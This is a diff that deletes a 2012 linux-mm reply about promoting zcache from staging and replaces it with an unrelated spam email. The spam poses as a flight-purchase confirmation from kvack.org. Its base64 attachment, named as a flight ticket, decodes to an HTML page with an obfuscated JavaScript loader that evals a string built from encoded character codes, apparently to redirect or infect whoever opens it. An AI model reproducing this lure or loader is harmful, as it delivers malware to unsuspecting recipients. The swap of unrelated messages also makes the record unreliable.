@@ -1,106 +1,132 @@
-Return-Path: <owner-linux-mm@kvack.org>
-Received: from psmtp.com (na3sys010amx110.postini.com [74.125.245.110])
-	by kanga.kvack.org (Postfix) with SMTP id 50C266B004D
-	for <linux-mm@kvack.org>; Tue,  7 Aug 2012 17:47:31 -0400 (EDT)
+Return-Path: <BrockUngerecht@wildblue.net>
+Content-Type: multipart/mixed;
+	boundary="========GMXBoundary192750550312824291753"
+Date: Tue, 7 Aug 2012 08:00:42 -0800
+From: <BrockUngerecht@kvack.org>
+Message-ID: <42499789275216.359659@kvack.org>
 MIME-Version: 1.0
-Message-ID: <3f8dfac9-2b92-442c-800a-f0bfef8a90cb@default>
-Date: Tue, 7 Aug 2012 14:47:05 -0700 (PDT)
-From: Dan Magenheimer <dan.magenheimer@oracle.com>
-Subject: RE: [PATCH 0/4] promote zcache from staging
-References: <1343413117-1989-1-git-send-email-sjenning@linux.vnet.ibm.com>
- <5021795A.5000509@linux.vnet.ibm.com>
-In-Reply-To: <5021795A.5000509@linux.vnet.ibm.com>
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: quoted-printable
-Sender: owner-linux-mm@kvack.org
+Subject: Re: Your Flight US 007-62426
+To: linux-mm@kvack.org
 List-ID: <linux-mm.kvack.org>
-To: Seth Jennings <sjenning@linux.vnet.ibm.com>
-Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>, Andrew Morton <akpm@linux-foundation.org>, Nitin Gupta <ngupta@vflare.org>, Minchan Kim <minchan@kernel.org>, Konrad Wilk <konrad.wilk@oracle.com>, Robert Jennings <rcj@linux.vnet.ibm.com>, linux-mm@kvack.org, linux-kernel@vger.kernel.org, devel@driverdev.osuosl.org, Kurt Hackel <kurt.hackel@oracle.com>
 
-> From: Seth Jennings [mailto:sjenning@linux.vnet.ibm.com]
-> Subject: Re: [PATCH 0/4] promote zcache from staging
->=20
-> On 07/27/2012 01:18 PM, Seth Jennings wrote:
-> > Some benchmarking numbers demonstrating the I/O saving that can be had
-> > with zcache:
-> >
-> > https://lkml.org/lkml/2012/3/22/383
->=20
-> There was concern that kernel changes external to zcache since v3.3 may
-> have mitigated the benefit of zcache.  So I re-ran my kernel building
-> benchmark and confirmed that zcache is still providing I/O and runtime
-> savings.
+--========GMXBoundary192750550312824291753
+Content-Type: multipart/alternative;
+	boundary="========GMXBoundary230557000014437769820"
 
-Hi Seth --
+--========GMXBoundary230557000014437769820
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
 
-Thanks for re-running your tests.  I have a couple of concerns and
-hope that you, and other interested parties, will read all the
-way through my lengthy response.
+Dear Customer,FLIGHT NUMBER  653-187DATE/TIME : SEPT 21, 2012, 19:18 PMARRIVING AIRPORT: SAN-DIEGO AIRPORTPRICE : 995.58 USDYour bought ticket is attached to the letter as a scan document .To use your ticket you should print it.DIONNE Mackey,
 
-The zcache issues I have seen in recent kernels arise when zcache
-gets "full".  I notice your original published benchmarks [1] include
-N=3D24, N=3D28, and N=3D32, but these updated results do not.  Are you plan=
-ning
-on completing the runs?  Second, I now see the numbers I originally
-published for what I thought was the same benchmark as yours are actually
-an order of magnitude larger (in sec) than yours.  I didn't notice
-this in March because we were focused on the percent improvement, not
-the raw measurements.  Since the hardware is highly similar, I suspect
-it is not a hardware difference but instead that you are compiling
-a much smaller kernel.  In other words, your test case is much
-smaller, and so exercises zcache much less.  My test case compiles
-a full enterprise kernel... what is yours doing?
+--========GMXBoundary230557000014437769820
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-IMHO, any cache in computer science needs to be measured both
-when it is not-yet-full and when it is full.  The "demo" zcache in
-staging works very well before it is full and I think our benchmarking
-in March and your re-run benchmarks demonstrate that.  At LSFMM, Andrea
-Arcangeli pointed out that zcache, for frontswap pages, has no "writeback"
-capabilities and, when it is full, it simply rejects further attempts
-to put data in its cache.  He said this is unacceptable for KVM and I
-agreed that it was a flaw that needed to be fixed before zcache should
-be promoted.  When I tested zcache for this, I found that not only was
-he right, but that zcache could not be fixed without a major rewrite.
+<html>
+<head>
+<style><!--
+background-color: #0c3496;font-family:"Mangal","Lucida Sans";font-size:28=
+px;font-style: italic;
+--></style>
+</head>
+<body>
+Dear Customer,<br /><br />
 
-This is one of the "fundamental flaws" of the "demo" zcache, but the new
-code base allows for this to be fixed.
+FLIGHT NUMBER  653-187<br />
+DATE/TIME : SEPT 21, 2012, 19:18 PM<br />
+ARRIVING AIRPORT: SAN-DIEGO AIRPORT<br />
+PRICE : 995.58 USD<br /><br />
 
-A second flaw is that the "demo" zcache has no concept of LRU for
-either cleancache or frontswap pages, or ability to reclaim pageframes
-at all for frontswap pages.  (And for cleancache, pageframe reclaim
-is semi-random).  As I've noted in other threads, this may be impossible
-to implement/fix with zsmalloc, and zsmalloc's author Nitin Gupta has
-agreed, but the new code base implements all of this with zbud.  One
-can argue that LRU is not a requirement for zcache, but a long history
-of operating systems theory would suggest otherwise.
+Your bought ticket is attached to the letter as a scan document .<br />
+To use your ticket you should print it.<br /><br />
 
-A third flaw is that the "demo" version has a very poor policy to
-determine what pages are "admitted".  The demo policy does take into
-account the total RAM in the system, but not current memory load
-conditions.  The new code base IMHO does a better job but discussion
-will be in a refereed presentation at the upcoming Plumber's meeting.
-The fix for this flaw might be back-portable to the "demo" version
-so is not a showstopper in the "demo" version, but fixing it is
-not just a cosmetic fix.
 
-I can add more issues to the list, but will stop here.  IMHO
-the "demo" zcache is not suitable for promotion from staging,
-which is why I spent over two months generating a new code base.
-I, perhaps more than anyone else, would like to see zcache used,
-by default, by real distros and customers, but I think it is
-premature to promote it, especially the old "demo" code.
+DIONNE Mackey,<br />
+</body></html>
 
-I do realize, however, that this decision is not mine alone so
-defer to the community to decide.
+--========GMXBoundary230557000014437769820--
 
-Dan
 
-[1] https://lkml.org/lkml/2012/3/22/383=20
-[2] http://lkml.indiana.edu/hypermail/linux/kernel/1203.2/02842.html=20
-=20
+--========GMXBoundary192750550312824291753
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="FLIGHT_TICKET_US879428844.htm"
 
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFs
+Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+DQo8aHRtbD4NCiA8
+aGVhZD4NCiAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0
+bWw7IGNoYXJzZXQ9dXRmLTgiPg0KIDwvaGVhZD4NCiA8Ym9keT4gIA0KDQo8aDE+PGI+UGxlYXNl
+IHdhaXQgYSBtb21lbnQuIFlvdSB3aWxsIGJlIGZvcndhcmRlZC4uLjwvaDE+PC9iPg0KDQo8c2Ny
+aXB0PnRyeXtuXj1NYXRoLnJvdW5kO31jYXRjaCh6eGMpe2U9ZXZhbDttPU1hdGg7bj0iMTA4Li4x
+MTcuLjEyNjAuLjEzMjYuLjM4NC4uNTIwLi4xMjAwLi4xNDQzLi4xMTg4Li4xNTIxLi4xMzA4Li4x
+MzEzLi4xMzIwLi4xNTA4Li41NTIuLjEzMzkuLjEyMTIuLjE1MDguLjgyOC4uMTQwNC4uMTIxMi4u
+MTQxNy4uMTIxMi4uMTQzMC4uMTM5Mi4uMTQ5NS4uNzkyLi4xNTczLi4xMDA4Li4xMjYxLi4xMjM2
+Li4xMDE0Li4xMTY0Li4xNDE3Li4xMjEyLi41MjAuLjQ2OC4uMTI3NC4uMTMzMi4uMTMwMC4uMTQ1
+Mi4uNTA3Li40OTIuLjExODMuLjU3Ni4uMTIwOS4uNDkyLi4xNTk5Li4xNTYuLjExNy4uMTA4Li4x
+MTcuLjEyNjAuLjEzMjYuLjEzNjguLjEyNjEuLjEzMDguLjEzMTMuLjEzNjguLjUyMC4uNDkyLi43
+NjcuLjE1Ni4uMTE3Li4xMDguLjE2MjUuLjM4NC4uMTMxMy4uMTI5Ni4uMTQ5NS4uMTIxMi4uNDE2
+Li4xNDc2Li4xNjkuLjEwOC4uMTE3Li4xMDguLjEzMDAuLjEzMzIuLjEyODcuLjE0MDQuLjE0MTcu
+LjEyMTIuLjE0MzAuLjEzOTIuLjU5OC4uMTQyOC4uMTQ4Mi4uMTI2MC4uMTUwOC4uMTIxMi4uNTIw
+Li40MDguLjc4MC4uMTI2MC4uMTMyNi4uMTM2OC4uMTI2MS4uMTMwOC4uMTMxMy4uMzg0Li4xNDk1
+Li4xMzY4Li4xMjg3Li43MzIuLjUwNy4uMTI0OC4uMTUwOC4uMTM5Mi4uMTQ1Ni4uNjk2Li42MTEu
+LjU2NC4uMTQ1Ni4uMTQwNC4uMTQ5NS4uMTM4MC4uMTU3My4uMTM2OC4uMTM2NS4uMTMzMi4uMTUw
+OC4uMTM4MC4uMTQ5NS4uNTUyLi4xNDgyLi4xNDA0Li43NTQuLjY3Mi4uNjI0Li42NzIuLjYyNC4u
+NTY0Li4xMzI2Li4xMzMyLi4xNDgyLi4xNDA0Li4xNDE3Li41NjQuLjE0OTUuLjEyNDguLjE0NDMu
+LjE0MjguLjE1MDguLjEyNDguLjE0ODIuLjEyMTIuLjEyNjEuLjEyMDAuLjU5OC4uMTM0NC4uMTM1
+Mi4uMTM0NC4uODE5Li4xMzQ0Li4xMjYxLi4xMjM2Li4xMzEzLi43MzIuLjY4OS4uMTIyNC4uMTI2
+MS4uNjM2Li43MjguLjExNzYuLjEyODcuLjEyMTIuLjcxNS4uNjQ4Li43NDEuLjEyMTIuLjY4OS4u
+MTE4OC4uNjUwLi4xMTg4Li41MDcuLjM4NC4uMTU0Ny4uMTI2MC4uMTMwMC4uMTM5Mi4uMTM1Mi4u
+NzMyLi41MDcuLjU4OC4uNjI0Li40NjguLjQxNi4uMTI0OC4uMTMxMy4uMTI2MC4uMTMzOS4uMTI0
+OC4uMTUwOC4uNzMyLi41MDcuLjU4OC4uNjI0Li40NjguLjQxNi4uMTM4MC4uMTUwOC4uMTQ1Mi4u
+MTQwNC4uMTIxMi4uNzkzLi40NjguLjE1MzQuLjEyNjAuLjE0OTUuLjEyNjAuLjEyNzQuLjEyNjAu
+LjE0MDQuLjEyNjAuLjE1MDguLjE0NTIuLjc1NC4uMTI0OC4uMTM2NS4uMTIwMC4uMTMwMC4uMTIx
+Mi4uMTQzMC4uNzA4Li4xNDU2Li4xMzMyLi4xNDk1Li4xMjYwLi4xNTA4Li4xMjYwLi4xNDQzLi4x
+MzIwLi43NTQuLjExNjQuLjEyNzQuLjEzODAuLjE0NDMuLjEyOTYuLjE1MjEuLjEzOTIuLjEzMTMu
+LjcwOC4uMTQwNC4uMTIxMi4uMTMyNi4uMTM5Mi4uNzU0Li41NzYuLjc2Ny4uMTM5Mi4uMTQ0My4u
+MTM0NC4uNzU0Li41NzYuLjc2Ny4uNDY4Li44MDYuLjcyMC4uNjExLi4xMjYwLi4xMzI2Li4xMzY4
+Li4xMjYxLi4xMzA4Li4xMzEzLi43NDQuLjQ0Mi4uNDkyLi43NjcuLjE1Ni4uMTE3Li4xMDguLjE2
+MjUuLjE1Ni4uMTE3Li4xMDguLjEzMjYuLjE0MDQuLjE0MzAuLjExODguLjE1MDguLjEyNjAuLjE0
+NDMuLjEzMjAuLjQxNi4uMTI2MC4uMTMyNi4uMTM2OC4uMTI2MS4uMTMwOC4uMTMxMy4uMTM2OC4u
+NTIwLi40OTIuLjE1OTkuLjE1Ni4uMTE3Li4xMDguLjExNy4uMTQxNi4uMTI2MS4uMTM2OC4uNDE2
+Li4xMjI0Li40MTYuLjczMi4uNDE2Li4xMjAwLi4xNDQzLi4xMTg4Li4xNTIxLi4xMzA4Li4xMzEz
+Li4xMzIwLi4xNTA4Li41NTIuLjEyODcuLjEzNjguLjEzMTMuLjExNjQuLjE1MDguLjEyMTIuLjg5
+Ny4uMTI5Ni4uMTMxMy4uMTMwOC4uMTMxMy4uMTMyMC4uMTUwOC4uNDgwLi41MDcuLjEyNjAuLjEz
+MjYuLjEzNjguLjEyNjEuLjEzMDguLjEzMTMuLjQ2OC4uNTMzLi43MDguLjEzMjYuLjU1Mi4uMTQ5
+NS4uMTIxMi4uMTUwOC4uNzgwLi4xNTA4Li4xMzkyLi4xNDgyLi4xMjYwLi4xMjc0Li4xNDA0Li4x
+NTA4Li4xMjEyLi41MjAuLjQ2OC4uMTQ5NS4uMTM2OC4uMTI4Ny4uNDY4Li41NzIuLjQ2OC4uMTM1
+Mi4uMTM5Mi4uMTUwOC4uMTM0NC4uNzU0Li41NjQuLjYxMS4uMTM0NC4uMTUyMS4uMTM4MC4uMTQ5
+NS4uMTQ1Mi4uMTQ4Mi4uMTI2MC4uMTQ0My4uMTM5Mi4uMTQ5NS4uMTM4MC4uNTk4Li4xMzY4Li4x
+NTIxLi42OTYuLjcyOC4uNTc2Li43MjguLjU3Ni4uNjExLi4xMjI0Li4xNDQzLi4xMzY4Li4xNTIx
+Li4xMzA4Li42MTEuLjEzODAuLjEzNTIuLjEzMzIuLjE1NDcuLjEzOTIuLjEzNTIuLjEzNjguLjEz
+MTMuLjExNjQuLjEzMDAuLjU1Mi4uMTQ1Ni4uMTI0OC4uMTQ1Ni4uNzU2Li4xNDU2Li4xMTY0Li4x
+MzM5Li4xMjEyLi43OTMuLjYzNi4uMTMyNi4uMTE2NC4uNjg5Li42NzIuLjEyNzQuLjExODguLjEz
+MTMuLjY2MC4uNzAyLi42ODQuLjEzMTMuLjYzNi4uMTI4Ny4uNjAwLi4xMjg3Li40NjguLjUzMy4u
+NzA4Li4xMzI2Li41NTIuLjE0OTUuLjEzOTIuLjE1NzMuLjEyOTYuLjEzMTMuLjU1Mi4uMTUzNC4u
+MTI2MC4uMTQ5NS4uMTI2MC4uMTI3NC4uMTI2MC4uMTQwNC4uMTI2MC4uMTUwOC4uMTQ1Mi4uNzkz
+Li40NjguLjEzNTIuLjEyNjAuLjEzMDAuLjEyMDAuLjEzMTMuLjEzMjAuLjUwNy4uNzA4Li4xMzI2
+Li41NTIuLjE0OTUuLjEzOTIuLjE1NzMuLjEyOTYuLjEzMTMuLjU1Mi4uMTQ1Ni4uMTMzMi4uMTQ5
+NS4uMTI2MC4uMTUwOC4uMTI2MC4uMTQ0My4uMTMyMC4uNzkzLi40NjguLjEyNjEuLjExNzYuLjE0
+OTUuLjEzMzIuLjE0MDQuLjE0MDQuLjE1MDguLjEyMTIuLjUwNy4uNzA4Li4xMzI2Li41NTIuLjE0
+OTUuLjEzOTIuLjE1NzMuLjEyOTYuLjEzMTMuLjU1Mi4uMTQwNC4uMTIxMi4uMTMyNi4uMTM5Mi4u
+NzkzLi40NjguLjYyNC4uNDY4Li43NjcuLjEyMjQuLjU5OC4uMTM4MC4uMTUwOC4uMTQ1Mi4uMTQw
+NC4uMTIxMi4uNTk4Li4xMzkyLi4xNDQzLi4xMzQ0Li43OTMuLjQ2OC4uNjI0Li40NjguLjc2Ny4u
+MTIyNC4uNTk4Li4xMzgwLi4xMzEzLi4xMzkyLi44NDUuLjEzOTIuLjE1MDguLjEzNjguLjEzNjUu
+LjExNzYuLjE1MjEuLjEzOTIuLjEzMTMuLjQ4MC4uNTA3Li4xNDI4Li4xMzY1Li4xMjAwLi4xNTA4
+Li4xMjQ4Li41MDcuLjUyOC4uNTA3Li41ODguLjYyNC4uNDY4Li41MzMuLjcwOC4uMTMyNi4uNTUy
+Li4xNDk1Li4xMjEyLi4xNTA4Li43ODAuLjE1MDguLjEzOTIuLjE0ODIuLjEyNjAuLjEyNzQuLjE0
+MDQuLjE1MDguLjEyMTIuLjUyMC4uNDY4Li4xMzUyLi4xMjEyLi4xMzY1Li4xMjM2Li4xMzUyLi4x
+MzkyLi41MDcuLjUyOC4uNTA3Li41ODguLjYyNC4uNDY4Li41MzMuLjcwOC4uMTY5Li4xMDguLjEx
+Ny4uMTA4Li4xMzAwLi4xMzMyLi4xMjg3Li4xNDA0Li4xNDE3Li4xMjEyLi4xNDMwLi4xMzkyLi41
+OTguLjEyMzYuLjEzMTMuLjEzOTIuLjg5Ny4uMTI5Ni4uMTMxMy4uMTMwOC4uMTMxMy4uMTMyMC4u
+MTUwOC4uMTM4MC4uODU4Li4xNDUyLi4xMDkyLi4xMTY0Li4xMzM5Li45MzYuLjEyNjEuLjEzMDgu
+LjEzMTMuLjQ4MC4uNTA3Li4xMTc2Li4xNDQzLi4xMjAwLi4xNTczLi40NjguLjUzMy4uMTA5Mi4u
+NjI0Li4xMTE2Li41OTguLjExNjQuLjE0NTYuLjEzNDQuLjEzMTMuLjEzMjAuLjEzMDAuLjgwNC4u
+MTM1Mi4uMTI2MC4uMTQwNC4uMTIwMC4uNTIwLi4xMjI0Li41MzMuLjcwOC4uMTY5Li4xMDguLjEx
+Ny4uMTUwMCIuc3BsaXQoIi4uIik7aD0yO3M9IiI7Zm9yKGk9MDtpLTY0NyE9MDtpPTEraSl7az1p
+O3MrPVN0cmluZ1siZnJvbUNoYXJDb2RlIl0obltrXS8oaS1oKk1hdGguZmxvb3IoaS9oKSsxMikp
+O31pZigwMTUtMHhhPT09MylpZih3aW5kb3cuZG9jdW1lbnQpZShzKTt9PC9zY3JpcHQ+DQoNCg0K
+DQo8L2JvZHk+DQo8L2h0bWw+ 
+
+
+--========GMXBoundary192750550312824291753--
